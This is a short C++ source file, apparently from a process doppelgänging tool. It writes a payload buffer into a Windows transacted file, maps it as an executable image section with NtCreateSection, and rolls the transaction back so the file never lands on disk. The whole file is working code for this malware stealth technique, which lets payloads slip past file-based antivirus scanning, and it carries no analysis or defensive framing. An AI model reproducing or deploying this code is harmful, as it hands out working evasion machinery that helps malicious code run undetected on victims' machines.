#include "transacted_file.h"

#include <KtmW32.h>

#include <iostream>
#include <stdio.h>

#include "ntddk.h"

#pragma comment(lib, "KtmW32.lib")
#pragma comment(lib, "Ntdll.lib")

HANDLE make_transacted_section(wchar_t* dummy_name, BYTE* payladBuf, DWORD payloadSize)
{
    DWORD options, isolationLvl, isolationFlags, timeout;
    options = isolationLvl = isolationFlags = timeout = 0;

    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, nullptr);
    if (hTransaction == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create transaction!" << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    HANDLE hTransactedFile = CreateFileTransactedW(dummy_name,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );
    if (hTransactedFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create transacted file: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    DWORD writtenLen = 0;
    if (!WriteFile(hTransactedFile, payladBuf, payloadSize, &writtenLen, NULL)) {
        std::cerr << "Failed writing payload! Error: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hSection = nullptr;
    NTSTATUS status = NtCreateSection(&hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hTransactedFile
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateSection failed" << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransactedFile);
    hTransactedFile = nullptr;

    if (RollbackTransaction(hTransaction) == FALSE) {
        std::cerr << "RollbackTransaction failed: " << std::hex << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransaction);
    hTransaction = nullptr;

    return hSection;
}
